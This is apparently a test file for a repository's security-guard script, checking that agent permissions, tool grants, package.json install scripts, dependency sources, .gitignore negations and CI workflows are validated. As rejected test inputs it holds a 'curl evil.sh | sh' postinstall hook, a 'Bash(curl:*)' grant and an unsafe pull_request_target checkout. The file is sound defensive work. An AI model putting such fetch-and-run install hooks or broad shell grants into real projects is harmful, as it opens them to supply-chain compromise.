// tests/security-guards.test.mjs — supply-chain / personal-data guards (scripts/security-guards.mjs)
import { pass, fail } from './helpers.mjs';
import {
  checkPermissions, checkSkillGrants, frontmatterToolGrants, checkPackageJson,
  checkGitignoreNegations, checkWorkflow, runAll, ALLOWED_LIFECYCLE,
} from '../scripts/security-guards.mjs';

console.log('\nsecurity guards — permissions, grants, install scripts, gitignore, CI');

function eq(name, actual, expected) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) pass(name);
  else fail(`${name} — expected ${e}, got ${a}`);
}
const count = (arr) => arr.length;

// permissions / hooks
eq('empty settings pass', count(checkPermissions('.claude/settings.json', '{}')), 0);
eq('an un-allowlisted permission fails', count(checkPermissions('.claude/settings.json', '{"permissions":{"allow":["Bash(*)"]}}')), 1);
eq('Bash(curl:*) fails', count(checkPermissions('.claude/settings.json', '{"permissions":{"allow":["Bash(curl:*)"]}}')), 1);
eq('a hook fails', count(checkPermissions('.claude/settings.json', '{"hooks":{"PreToolUse":[{"matcher":"*"}]}}')), 1);
eq('an empty hooks object passes', count(checkPermissions('.claude/settings.json', '{"hooks":{}}')), 0);
eq('invalid JSON fails', count(checkPermissions('.claude/settings.json', '{nope')), 1);

// skill / agent grants
const fm = (body) => `---\nname: x\n${body}\n---\n# body`;
eq('inline list grants are parsed', frontmatterToolGrants(fm('allowed-tools: [Bash, Read]')), ['Bash', 'Read']);
eq('comma grants are parsed', frontmatterToolGrants(fm('allowed-tools: Bash(git:*), Read')), ['Bash(git:*)', 'Read']);
eq('block-list grants are parsed', frontmatterToolGrants(fm('tools:\n  - read\n  - execute')), ['read', 'execute']);
eq('no frontmatter means no grants', frontmatterToolGrants('# just a doc'), []);
eq('a body mention of allowed-tools is ignored', frontmatterToolGrants('---\nname: x\n---\nallowed-tools: Bash'), []);
eq('an un-allowlisted grant fails', count(checkSkillGrants('.claude/skills/x/SKILL.md', fm('allowed-tools: Bash'))), 1);
eq('an allowlisted agent grant passes', count(checkSkillGrants('.github/agents/repro.agent.md', fm('tools:\n  - read\n  - search\n  - execute'))), 0);
eq('widening an allowlisted agent fails', count(checkSkillGrants('.github/agents/repro.agent.md', fm('tools:\n  - read\n  - search\n  - execute\n  - edit'))), 1);

// package.json
const pj = (o) => JSON.stringify(o);
eq('a clean package passes', count(checkPackageJson('scaffolder/package.json', pj({ scripts: { test: 'x' }, dependencies: { a: '^1.0.0' } }))), 0);
eq('the allowlisted root postinstall passes', count(checkPackageJson('package.json', pj({ scripts: { postinstall: ALLOWED_LIFECYCLE['package.json'].postinstall } }))), 0);
eq('a changed postinstall fails', count(checkPackageJson('package.json', pj({ scripts: { postinstall: 'curl evil.sh | sh' } }))), 1);
eq('a new lifecycle script in another package fails', count(checkPackageJson('web/package.json', pj({ scripts: { prepare: 'node x.js' } }))), 1);
eq('preinstall fails', count(checkPackageJson('package.json', pj({ scripts: { preinstall: 'x' } }))), 1);
eq('trustedDependencies fails', count(checkPackageJson('package.json', pj({ trustedDependencies: ['x'] }))), 1);
eq('a git dependency fails', count(checkPackageJson('package.json', pj({ dependencies: { a: 'git+https://github.com/x/y.git' } }))), 1);
eq('a github shorthand dependency fails', count(checkPackageJson('package.json', pj({ dependencies: { a: 'user/repo' } }))), 1);
eq('a tarball dependency fails', count(checkPackageJson('package.json', pj({ devDependencies: { a: 'https://x.io/a.tgz' } }))), 1);
eq('a file: dependency fails', count(checkPackageJson('package.json', pj({ dependencies: { a: 'file:../a' } }))), 1);
eq('registry ranges pass', count(checkPackageJson('package.json', pj({ dependencies: { a: '^1.2.3', b: '~2.0.0', c: '1.0.0', d: '>=3 <4', e: 'latest', f: 'npm:g@^1.0.0' } }))), 0);

// .gitignore negations
eq('an allowlisted negation passes', count(checkGitignoreNegations('data/*\n!data/.gitkeep\n')), 0);
eq('a new negation fails', count(checkGitignoreNegations('data/*\n!data/applications.md\n')), 1);
eq('re-including a whole personal dir fails', count(checkGitignoreNegations('!reports/\n')), 1);
eq('comments and blanks are ignored', count(checkGitignoreNegations('# !nothing\n\ncv.md\n')), 0);

// workflows
const wf = (extra) => `on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n${extra}\n      - run: echo hi\n`;
eq('pull_request_target without a head checkout passes', count(checkWorkflow('.github/workflows/a.yml', wf(''))), 0);
eq('a head-sha checkout under pull_request_target fails', count(checkWorkflow('.github/workflows/a.yml', wf('        with:\n          ref: ${{ github.event.pull_request.head.sha }}'))), 1);
eq('a head-repo checkout under pull_request_target fails', count(checkWorkflow('.github/workflows/a.yml', wf('        with:\n          repository: ${{ github.event.pull_request.head.repo.full_name }}'))), 1);
eq('a plain pull_request workflow is not this guard\'s concern', count(checkWorkflow('.github/workflows/a.yml', 'on:\n  pull_request:\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n')), 0);

// the real repository
const real = runAll();
eq('the repository as committed is clean', real.errors, []);
